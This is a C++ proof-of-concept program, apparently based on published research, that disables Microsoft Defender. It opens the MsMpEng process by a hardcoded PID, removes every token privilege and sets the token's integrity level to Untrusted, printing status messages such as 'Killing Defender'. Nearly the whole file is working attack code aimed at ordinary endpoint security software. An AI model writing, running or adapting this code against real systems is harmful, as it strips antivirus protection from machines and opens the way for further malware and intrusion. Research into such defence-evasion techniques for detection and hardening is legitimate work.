//////////////////////////////////////////////////////////////////////////////////////////////////////////////
// A small POC to make Defender Useless by removing Token privileges and lowering Token Integrity      
//////////////////////////////////////////////////////////////////////////////////////////////////////////////


//Credits - https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/

#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <conio.h>


bool EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return   FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
    {
        CloseHandle(hToken);
        return false;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {
        CloseHandle(hToken);
        return false;
    }
    return true;
}



BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
    else
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}


int main()
{
    LUID sedebugnameValue;
    EnableDebugPrivilege();

	printf("[*] Killing Defender...\n");

    // hardcoding PID of msmpeng for now
	HANDLE phandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 6760);

	if (phandle != INVALID_HANDLE_VALUE) {

		printf("[*] Opened Target Handle\n");
	}

    printf("%p\n", phandle);
  
    HANDLE ptoken;

   BOOL token = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);

   printf("[*] Opened Target Token Handle");


   LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);


   TOKEN_PRIVILEGES tkp;
  
   tkp.PrivilegeCount = 1;
   tkp.Privileges[0].Luid = sedebugnameValue;
   tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

   if (!AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {

       printf("Failed\n");
   }

  
   // Remove all privileges
   SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
   SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
   SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
   SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
   SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
   SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
   SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
   SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
   SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
   SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
   SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
   SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
   SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
   SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

   printf("[*] Removed All Privileges\n");


   DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;


   SID integrityLevelSid{};
   integrityLevelSid.Revision = SID_REVISION;
   integrityLevelSid.SubAuthorityCount = 1;
   integrityLevelSid.IdentifierAuthority.Value[5] = 16;
   integrityLevelSid.SubAuthority[0] = integrityLevel;

   TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
   tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
   tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

   if (!SetTokenInformation(
       ptoken,
       TokenIntegrityLevel,
       &tokenIntegrityLevel,
       sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid)))
   {
        printf("SetTokenInformation failed\n");
   }

   printf("[*] Token Integrity set to Untrusted\n");

}

